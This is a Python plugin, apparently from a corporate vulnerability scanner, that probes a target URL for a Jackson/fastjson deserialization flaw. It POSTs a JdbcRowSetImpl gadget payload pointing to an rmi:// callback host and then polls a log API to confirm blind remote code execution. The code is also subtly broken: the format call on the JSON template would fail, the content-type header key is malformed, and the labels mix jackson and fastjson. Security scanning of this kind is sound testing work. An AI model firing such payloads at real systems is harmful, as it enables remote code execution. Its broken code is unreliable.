#!/ usr/bin/env
# coding=utf-8
#
# Copyright 2019 ztosec & https://www.zto.com/
#
# Licensed under the Apache License, Version 2.0 (the "License"); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.
"""
author: b5mali4
"""

import ssl
import urllib3

urllib3.disable_warnings()
import json
import requests
from common.http_util import header_to_lowercase, ContentType, HttpMethod
from plugins.base.vuln_enum import VulnType
from plugins.base.base_checker import BaseChecker


class Checker(BaseChecker):
    def check_logic(self, request_raw):
        """
        检测漏洞模块，只有DNS模块有效
        1.构造poc发送请求，
        两种情况
        1，普通参数 将其转成json
        2.xml将其转成json  
        3.然后多加 "@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://xx:10086/Object","autoCommit":true 到json头部

        :param request_raw: 
        :return: 
        """
        http_method = str(request_raw["method"]).lower()
        temp_url = str(request_raw["url"]).strip()
        temp_headers = header_to_lowercase(json.loads(request_raw['headers']))
        temp_data = request_raw['data'] if "data" in request_raw else None

        blind_poc, check_blind_poc_url, hunter_log_api_token = self.generate_blind_poc()

        if not blind_poc["data"]:
            return

        if blind_poc["type"] == "dns":
            attack_payload = "rmi://%s" % (blind_poc["data"])  # 得到的是一个域名，域名前缀为uuid
        elif blind_poc["type"] == "socket":
            attack_payload = "rmi://%s:%s/%s" % (
                blind_poc["data"]["host"], blind_poc["data"]["port"], blind_poc["data"]["uuid"])

        if http_method == HttpMethod.POST:
            temp_headers["content-type:"] = "application/json;"
            poc_data = '["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName": "{dataSourceName}", "autoCommit": true }]'.format(
                attack_payload + "/poc")

            try:
                requests.post(url=temp_url, data=poc_data, headers=temp_headers, timeout=5, verify=False)
            except Exception:
                pass

            req = requests.get(check_blind_poc_url, headers={"token": hunter_log_api_token}, timeout=5)
            if req:
                response = req.json()
                if "status" in response and response["status"] == 200:
                    self.result['status'] = True
                    self.result['info'] = '%s 存在一个fastjson反序列化漏洞' % request_raw['url']
                    self.result['payload'] = json.dumps(poc_data)

    def init_plugin_info(self):
        tag = "jackson"
        name = "jackjson1"
        author = "b5mali4"
        imp_version = "jackson在2.2.9及之前版本"
        description = "低版本中,存在java反序列化漏洞可导致远程代码执行，参考链接http://wiki.dev.ztosys.com" \
                      "/pages/viewpage.action?pageId=21743499"
        repair = "升级fastjson到最新版"
        type = VulnType.CMD_ECT
        temp_info = {"repair": repair, "name": name, "type": type, "description": description,
                     "imp_version": imp_version, "author": author, "tag": tag}
        self.info = dict(self.info, **temp_info)
